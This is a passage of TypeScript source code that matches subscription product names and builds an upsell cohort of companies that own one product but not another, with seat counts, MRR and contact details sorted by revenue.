   * Companies excluded because they already have `--to-product` (counted but
   * not listed, to keep the cohort focused on the *actionable* set).
   */
  alreadyHaveToProduct: number;
  /** How many companies match `--from-product` at all (before exclusion). */
  totalFromProductCompanies: number;
}

interface MinimalContact {
  companyId: string;
  firstName?: string;
  lastName?: string;
  email?: string;
}

/**
 * Match a free-text product query against a subscription's product name.
 *
 * Honors the same case-insensitive substring + whole-word-token semantics the
 * existing `recommendations` engine uses elsewhere. Callers can pass either an
 * exact product name (`"Microsoft 365 Business Basic [New Commerce
 * Experience]"`) or a partial keyword (`"Business Basic"`) — both work.
 */
function productNameMatches(subscriptionProductName: string, query: string): boolean {
  if (!subscriptionProductName || !query) return false;
  const name = subscriptionProductName.toLowerCase();
  const q = query.toLowerCase();
  if (name.includes(q)) return true;
  // Token-based fallback: every word in the query must appear in the name.
  const tokens = q.split(/\s+/).filter((t) => t.length > 2);
  if (tokens.length === 0) return false;
  return tokens.every((t) => name.includes(t));
}

/**
 * Find companies that have `fromProduct` but not `toProduct`.
 *
 * Per the MCP "Proactive Upsell Opportunity Finder" pattern (Guide 3b), this
 * composes over the three inputs a partner already has access to:
 *   - `subscriptions` — the universe of active subscriptions
 *   - `companies` — for name resolution + the no-active-sub cohort
 *   - `contacts` (optional) — for follow-up routing
 *
 * Returns the cohort with seats, MRR, and contact details attached. The
 * caller decides how to render it (table for humans, JSON for agents).
 */
export function findUpsellCohort(
  subscriptions: SubscriptionInput[],
  fromProduct: string,
  toProduct: string,
  options?: {
    companies?: Array<{ id: string; name: string }>;
    contacts?: MinimalContact[];
  },
): UpsellCohortReport {
  const companyNames = new Map<string, string>();
  if (options?.companies) {
    for (const c of options.companies) companyNames.set(c.id, c.name);
  }

  // Group active subs by company; track whether each company has fromProduct
  // and/or toProduct, and record the qualifying `from` subscriptions.
  const byCompany = new Map<string, {
    companyName: string;
    hasFrom: boolean;
    hasTo: boolean;
    fromSubs: UpsellMatch["fromSubscriptions"];
  }>();

  for (const sub of subscriptions) {
    if (sub.status !== "Active" || !sub.companyId) continue;
    const productName = sub.productName ?? "";
    const matchesFrom = productNameMatches(productName, fromProduct);
    const matchesTo = productNameMatches(productName, toProduct);
    if (!matchesFrom && !matchesTo) continue;

    const companyName = sub.companyName ?? companyNames.get(sub.companyId) ?? sub.companyId;
    const entry = byCompany.get(sub.companyId) ?? {
      companyName,
      hasFrom: false,
      hasTo: false,
      fromSubs: [],
    };
    if (matchesFrom) {
      entry.hasFrom = true;
      entry.fromSubs.push({
        subscriptionId: sub.id,
        productId: sub.productId,
        productName,
        quantity: sub.quantity ?? 0,
        price: sub.price ?? 0,
        billingTerm: sub.billingTerm ?? "Monthly",
      });
    }
    if (matchesTo) {
      entry.hasTo = true;
    }
    byCompany.set(sub.companyId, entry);
  }

  // Bucket contacts by company once, for O(n) lookup.
  const contactsByCompany = new Map<string, Array<{ name: string; email: string }>>();
  if (options?.contacts) {
    for (const c of options.contacts) {
      if (!c.email) continue;
      const name = [c.firstName, c.lastName].filter(Boolean).join(" ").trim();
      const list = contactsByCompany.get(c.companyId) ?? [];
      list.push({ name: name || c.email, email: c.email });
      contactsByCompany.set(c.companyId, list);
    }
  }

  const matches: UpsellMatch[] = [];
  let alreadyHaveToProduct = 0;
  let totalFromProductCompanies = 0;

  for (const [companyId, entry] of byCompany) {
    if (!entry.hasFrom) continue;
    totalFromProductCompanies++;
    if (entry.hasTo) {
      alreadyHaveToProduct++;
      continue;
    }
    const fromSeats = entry.fromSubs.reduce((sum, s) => sum + (s.quantity || 0), 0);
    const fromMrr = entry.fromSubs.reduce(
      (sum, s) => sum + subscriptionMrr(s.price, s.quantity, s.billingTerm),
      0,
    );
    matches.push({
      companyId,
      companyName: entry.companyName,
      fromSubscriptions: entry.fromSubs,
      fromSeats,
      fromMrr: Number(fromMrr.toFixed(2)),
      contacts: contactsByCompany.get(companyId) ?? [],
      opportunityType: "Upsell",
    });
  }

  // Sort by MRR descending so the highest-leverage targets float to the top.
  matches.sort((a, b) => b.fromMrr - a.fromMrr);

  return {
    fromProduct,
    toProduct,
    matches,
    totalFromSeats: matches.reduce((sum, m) => sum + m.fromSeats, 0),
    totalFromMrr: Number(matches.reduce((sum, m) => sum + m.fromMrr, 0).toFixed(2)),
    alreadyHaveToProduct,
    totalFromProductCompanies,
  };
}
